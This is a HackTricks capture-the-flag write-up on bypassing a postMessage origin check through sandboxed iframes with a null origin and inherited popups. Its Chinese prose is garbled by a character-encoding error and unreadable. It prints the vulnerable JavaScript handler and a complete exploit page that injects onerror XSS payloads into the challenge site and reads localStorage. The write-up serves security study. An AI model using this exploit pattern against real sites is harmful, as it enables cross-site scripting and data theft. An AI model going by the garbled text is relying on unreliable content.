# é€šè¿‡ä½¿ç”¨iframeç»•è¿‡SOP - 1

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## SOP-1ä¸­çš„Iframes

åœ¨ç”±[**NDevTK**](https://github.com/NDevTK)å’Œ[**Terjanq**](https://github.com/terjanq)åˆ›å»ºçš„[**æŒ‘æˆ˜**](https://github.com/terjanq/same-origin-xss)ä¸­ï¼Œæ‚¨éœ€è¦åˆ©ç”¨ä»£ç ä¸­çš„XSSã€‚
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
ä¸»è¦é—®é¢˜åœ¨äº[**ä¸»é¡µ**](https://so-xss.terjanq.me)ä½¿ç”¨DomPurifyå‘é€`data.body`ï¼Œå› æ­¤ä¸ºäº†å°†æ‚¨è‡ªå·±çš„htmlæ•°æ®å‘é€åˆ°è¯¥ä»£ç ï¼Œæ‚¨éœ€è¦**ç»•è¿‡**`e.origin !== window.origin`ã€‚

è®©æˆ‘ä»¬çœ‹çœ‹ä»–ä»¬æå‡ºçš„è§£å†³æ–¹æ¡ˆã€‚

### SOPç»•è¿‡ 1 (e.origin === null)

å½“`//example.org`åµŒå…¥åˆ°ä¸€ä¸ª**å—æ²™ç›’ä¿æŠ¤çš„iframe**ä¸­æ—¶ï¼Œé¡µé¢çš„**origin**å°†ä¸º**`null`**ï¼Œå³**`window.origin === null`**ã€‚å› æ­¤ï¼Œåªéœ€é€šè¿‡`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`åµŒå…¥iframeï¼Œæˆ‘ä»¬å°±å¯ä»¥**å¼ºåˆ¶`null` origin**ã€‚

å¦‚æœé¡µé¢æ˜¯**å¯åµŒå…¥çš„**ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡è¯¥ä¿æŠ¤ï¼ˆå¯èƒ½è¿˜éœ€è¦å°†cookieè®¾ç½®ä¸º`SameSite=None`ï¼‰ã€‚

### SOPç»•è¿‡ 2 (window.origin === null)

è¾ƒå°‘äººçŸ¥é“çš„äº‹å®æ˜¯ï¼Œå½“è®¾ç½®**æ²™ç›’å€¼`allow-popups`**æ—¶ï¼Œ**æ‰“å¼€çš„å¼¹å‡ºçª—å£**å°†**ç»§æ‰¿**æ‰€æœ‰**å—æ²™ç›’ä¿æŠ¤çš„å±æ€§**ï¼Œé™¤éè®¾ç½®äº†`allow-popups-to-escape-sandbox`ã€‚\
å› æ­¤ï¼Œä»**null origin**æ‰“å¼€ä¸€ä¸ª**å¼¹å‡ºçª—å£**å°†ä½¿å¼¹å‡ºçª—å£å†…éƒ¨çš„**`window.origin`**ä¹Ÿå˜ä¸º**`null`**ã€‚

### æŒ‘æˆ˜è§£å†³æ–¹æ¡ˆ

å› æ­¤ï¼Œå¯¹äºè¿™ä¸ªæŒ‘æˆ˜ï¼Œå¯ä»¥**åˆ›å»º**ä¸€ä¸ª**iframe**ï¼Œ**æ‰“å¼€ä¸€ä¸ªå¼¹å‡ºçª—å£**åˆ°å…·æœ‰æ˜“å—XSSä»£ç å¤„ç†ç¨‹åºï¼ˆ`/iframe.php`ï¼‰çš„é¡µé¢ï¼Œå› ä¸º`window.origin === e.origin`ï¼Œå› ä¸ºä¸¤è€…éƒ½æ˜¯`null`ï¼Œæ‰€ä»¥å¯ä»¥**å‘é€ä¸€ä¸ªå°†åˆ©ç”¨XSSçš„æœ‰æ•ˆè´Ÿè½½**ã€‚

è¯¥**æœ‰æ•ˆè´Ÿè½½**å°†è·å–**æ ‡è¯†ç¬¦**å¹¶å°†ä¸€ä¸ª**XSS**å‘é€å›**é¡¶éƒ¨é¡µé¢**ï¼ˆæ‰“å¼€å¼¹å‡ºçª—å£çš„é¡µé¢ï¼‰ï¼Œ**è¯¥é¡µé¢**å°†**æ›´æ”¹ä½ç½®**åˆ°**æ˜“å—æ”»å‡»çš„**`/iframe.php`ã€‚å› ä¸ºæ ‡è¯†ç¬¦æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥ä¸éœ€è¦æ»¡è¶³æ¡ä»¶`window.origin === e.origin`ï¼ˆè¯·è®°ä½ï¼Œoriginæ˜¯æ¥è‡ªå…·æœ‰**origin** **`null`**çš„iframeçš„**å¼¹å‡ºçª—å£**ï¼‰å› ä¸º`data.identifier === identifier`ã€‚ç„¶åï¼Œ**XSSå°†å†æ¬¡è§¦å‘**ï¼Œè¿™æ¬¡åœ¨æ­£ç¡®çš„originä¸­ã€‚
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
